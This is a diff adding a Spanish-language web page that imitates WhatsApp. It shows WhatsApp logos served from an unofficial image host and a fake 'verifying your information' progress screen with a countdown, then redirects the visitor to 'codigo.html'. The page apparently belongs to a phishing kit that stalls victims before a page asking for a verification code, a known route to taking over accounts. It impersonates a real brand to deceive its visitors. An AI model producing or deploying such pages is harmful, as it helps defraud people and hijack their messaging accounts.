@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando - WhatsApp</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #51CE70;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            color: white;
+        }
+
+        .loading-container img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            width: 80%;
+            max-width: 400px;
+            height: 20px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar-inner {
+            height: 100%;
+            width: 0;
+            background-color: white;
+            border-radius: 10px;
+            animation: loading 5s ease-in-out forwards;
+        }
+
+        .loading-detail {
+            font-size: 1rem;
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+
+        .spinner {
+            margin-top: 30px;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s infinite linear;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        footer {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        footer img {
+            width: 80px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <img src="https://sappsapp23.sirv.com/docs/JvsnINJ2CZv.svg" alt="Logo WhatsApp">
+        <p class="loading-text">Estamos verificando tu información...</p>
+        <div class="progress-bar">
+            <div class="progress-bar-inner"></div>
+        </div>
+        <p class="loading-detail">Esto puede tardar unos segundos. No cierres la página.</p>
+                    <div class="contador">
+            <span id="timer" >10</span>
+    </div>
+        <div class="spinner"></div>
+    </div>
+
+    <footer>
+        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+    </footer>
+
+  <script>
+    let timeLeft = 10;
+    const timerDisplay = document.getElementById("timer");
+
+    const countdown = setInterval(() => {
+      timeLeft--;
+      timerDisplay.textContent = timeLeft;
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        window.location.href = "codigo.html";
+      }
+    }, 1000);
+  </script>
+
+</body></html>
